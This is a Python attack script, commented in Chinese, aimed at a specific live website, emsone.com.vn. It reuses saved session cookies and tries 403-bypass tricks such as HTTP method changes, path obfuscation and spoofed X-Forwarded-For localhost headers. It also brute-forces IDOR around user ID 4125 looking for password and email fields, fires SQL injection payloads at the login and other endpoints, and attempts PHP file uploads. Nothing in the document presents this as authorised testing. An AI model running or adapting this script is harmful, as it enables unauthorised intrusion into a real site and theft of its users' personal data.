#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
import time
import random
from urllib.parse import urljoin, quote
import urllib3
urllib3.disable_warnings()

class AdvancedBypass:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def bypass_403_methods(self, path):
        """403绕过方法集合"""
        url = urljoin(self.base_url, path)
        bypass_methods = []
        
        # 方法1: HTTP方法覆盖
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
        for method in methods:
            try:
                r = self.session.request(method, url, timeout=5)
                if r.status_code == 200:
                    bypass_methods.append(f"Method: {method}")
            except:
                pass
        
        # 方法2: 路径混淆
        path_variants = [
            path + "/",
            path + "//",
            path + "/.",
            path + "/..",
            path + "%2f",
            path + "%2F",
            path + "?",
            path + "??",
            path + "///",
            "/.%2e" + path,
            path.replace("/", "//"),
            path.replace("/", "/%2f"),
        ]
        
        for variant in path_variants:
            try:
                r = self.session.get(urljoin(self.base_url, variant), timeout=5)
                if r.status_code == 200:
                    bypass_methods.append(f"Path: {variant}")
            except:
                pass
        
        # 方法3: Header绕过
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-URL": path},
            {"X-Rewrite-URL": path},
            {"X-Forwarded-Server": "localhost"},
            {"X-Host": "127.0.0.1"},
            {"X-Forwarded-Proto": "http"},
            {"X-Forwarded-Port": "80"},
            {"X-Forwarded-Scheme": "http"},
            {"Referer": self.base_url},
            {"Origin": self.base_url},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Cluster-Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"X-Forwarded": "for=127.0.0.1"},
            {"Base-Url": self.base_url},
            {"X-ProxyUser-Ip": "127.0.0.1"},
        ]
        
        for headers in bypass_headers:
            try:
                r = self.session.get(url, headers=headers, timeout=5)
                if r.status_code == 200:
                    bypass_methods.append(f"Header: {list(headers.keys())[0]}")
            except:
                pass
        
        # 方法4: 大小写混淆
        case_variants = [
            path.upper(),
            path.lower(),
            path.swapcase(),
            path.capitalize(),
        ]
        
        for variant in case_variants:
            try:
                r = self.session.get(urljoin(self.base_url, variant), timeout=5)
                if r.status_code == 200:
                    bypass_methods.append(f"Case: {variant}")
            except:
                pass
        
        return bypass_methods
    
    def test_api_endpoints(self):
        """测试API端点"""
        print("[*] API端点深度测试...")
        
        api_patterns = [
            "/Account/GetUserInfo",
            "/Account/GetUserInfo?id=1",
            "/Account/GetUserInfo?ID=1",
            "/Account/GetUserInfo?Id=1",
            "/Account/ChangePassword",
            "/Account/Profile",
            "/Account/Logout",
            "/Admin/Users",
            "/Admin/GetUsers",
            "/Admin/GetUser?id=1",
            "/Admin/Export",
            "/Admin/Settings",
            "/Admin/Config",
            "/api/users",
            "/api/user/1",
            "/api/admin",
            "/api/data",
            "/api/export",
            "/api/upload",
            "/api/delete",
            "/api/UpdateUser",
            "/api/CreateUser",
            "/api/DeleteUser",
            "/api/GetAllUsers",
            "/Report/Export",
            "/Report/Download",
            "/Data/Export",
            "/Data/Download",
            "/File/Upload",
            "/File/Download",
            "/Upload/File",
            "/Download/File",
        ]
        
        results = []
        for path in api_patterns:
            url = urljoin(self.base_url, path)
            try:
                # GET测试
                r = self.session.get(url, timeout=5)
                if r.status_code in [200, 201, 302]:
                    results.append({
                        'url': url,
                        'method': 'GET',
                        'status': r.status_code,
                        'length': len(r.content)
                    })
                    print(f"[+] {url} [{r.status_code}]")
                
                # POST测试
                r = self.session.post(url, json={}, timeout=5)
                if r.status_code in [200, 201, 302]:
                    results.append({
                        'url': url,
                        'method': 'POST',
                        'status': r.status_code,
                        'length': len(r.content)
                    })
                    print(f"[+] {url} [POST] [{r.status_code}]")
                
                # 403绕过测试
                if r.status_code == 403:
                    bypasses = self.bypass_403_methods(path)
                    if bypasses:
                        print(f"[!] 403 Bypass成功: {path}")
                        for bypass in bypasses[:3]:
                            print(f"    - {bypass}")
                        results.append({
                            'url': url,
                            'status': '403_BYPASSED',
                            'bypasses': bypasses
                        })
                
            except Exception as e:
                pass
        
        return results
    
    def test_idor_deep(self):
        """深度IDOR测试"""
        print("[*] 深度IDOR测试...")
        
        # 基于已知ID=4125进行测试
        base_id = 4125
        test_ids = [
            base_id - 1, base_id - 2, base_id + 1, base_id + 2,
            0, 1, 2, -1, 999999, 9999999
        ]
        
        idor_paths = [
            "/Account/GetUserInfo?id={}",
            "/Account/GetUserInfo?ID={}",
            "/Account/GetUserInfo?Id={}",
            "/api/user/{}",
            "/api/users/{}",
            "/Admin/GetUser?id={}",
            "/Admin/GetUser?ID={}",
            "/Admin/Users/{}",
        ]
        
        vulnerabilities = []
        for path_template in idor_paths:
            for test_id in test_ids:
                path = path_template.format(test_id)
                url = urljoin(self.base_url, path)
                try:
                    r = self.session.get(url, timeout=5)
                    if r.status_code == 200 and len(r.content) > 100:
                        # 检查是否返回了其他用户数据
                        content = r.text.lower()
                        if any(keyword in content for keyword in ['username', 'email', 'mobile', 'fullname', 'password']):
                            print(f"[!] Potential IDOR: {url}")
                            vulnerabilities.append({
                                'type': 'IDOR',
                                'url': url,
                                'test_id': test_id,
                                'response_length': len(r.content)
                            })
                except:
                    pass
        
        return vulnerabilities
    
    def test_sqli_deep(self):
        """深度SQL注入测试"""
        print("[*] 深度SQL注入测试...")
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            "1' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR 'x'='x",
            "') OR ('x'='x",
            "1' OR '1'='1'--",
            "1' OR 1=1 LIMIT 1--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        test_params = [
            "/Account/JLogin?MobileNumber={}&Password=test",
            "/Account/GetUserInfo?id={}",
            "/Account/GetUserInfo?name={}",
            "/api/search?q={}",
            "/api/users?id={}",
            "/Admin/Search?keyword={}",
        ]
        
        vulnerabilities = []
        for param_template in test_params:
            for payload in sqli_payloads:
                try:
                    path = param_template.format(quote(payload))
                    url = urljoin(self.base_url, path)
                    start_time = time.time()
                    r = self.session.get(url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    content_lower = r.text.lower()
                    error_indicators = [
                        'sql syntax', 'mysql', 'postgresql', 'oracle',
                        'microsoft ole db', 'odbc', 'sqlserver',
                        'warning:', 'error in your sql',
                        'quoted string', 'unclosed quotation'
                    ]
                    
                    if any(indicator in content_lower for indicator in error_indicators):
                        print(f"[!] SQLi错误: {url}")
                        vulnerabilities.append({
                            'type': 'SQL Injection (Error-based)',
                            'url': url,
                            'payload': payload
                        })
                    
                    if elapsed > 4:  # 时间盲注
                        print(f"[!] SQLi时间延迟: {url} ({elapsed:.2f}s)")
                        vulnerabilities.append({
                            'type': 'SQL Injection (Time-based)',
                            'url': url,
                            'payload': payload,
                            'delay': elapsed
                        })
                except:
                    pass
        
        return vulnerabilities
    
    def test_file_operations(self):
        """文件操作测试"""
        print("[*] 文件操作测试...")
        
        file_paths = [
            "/Upload", "/api/Upload", "/File/Upload",
            "/Account/Upload", "/Admin/Upload",
            "/Download", "/api/Download", "/File/Download",
            "/Export", "/api/Export", "/Report/Export",
            "/Backup", "/api/Backup",
        ]
        
        results = []
        for path in file_paths:
            url = urljoin(self.base_url, path)
            try:
                # GET测试
                r = self.session.get(url, timeout=5)
                if r.status_code in [200, 405]:
                    results.append({
                        'url': url,
                        'method': 'GET',
                        'status': r.status_code
                    })
                    print(f"[+] {url} [{r.status_code}]")
                
                # POST测试（文件上传）
                test_files = {
                    'file': ('test.php', '<?php phpinfo(); ?>', 'application/x-php'),
                    'image': ('test.jpg', b'\xFF\xD8\xFF\xE0', 'image/jpeg'),
                }
                
                for name, (filename, content, content_type) in test_files.items():
                    files = {name: (filename, content, content_type)}
                    r = self.session.post(url, files=files, timeout=5)
                    if r.status_code in [200, 201]:
                        print(f"[!] 文件上传可能: {url}")
                        results.append({
                            'url': url,
                            'method': 'POST',
                            'status': r.status_code,
                            'file_type': filename
                        })
            except:
                pass
        
        return results
    
    def run_all(self):
        """执行所有测试"""
        print("[*] 开始高级绕过测试...\n")
        
        api_results = self.test_api_endpoints()
        idor_results = self.test_idor_deep()
        sqli_results = self.test_sqli_deep()
        file_results = self.test_file_operations()
        
        # 保存结果
        all_results = {
            'api_endpoints': api_results,
            'idor': idor_results,
            'sqli': sqli_results,
            'file_operations': file_results
        }
        
        with open('advanced_bypass_results.json', 'w', encoding='utf-8') as f:
            json.dump(all_results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] API端点: {len(api_results)}")
        print(f"[+] IDOR漏洞: {len(idor_results)}")
        print(f"[+] SQL注入: {len(sqli_results)}")
        print(f"[+] 文件操作: {len(file_results)}")

if __name__ == "__main__":
    bypass = AdvancedBypass()
    bypass.run_all()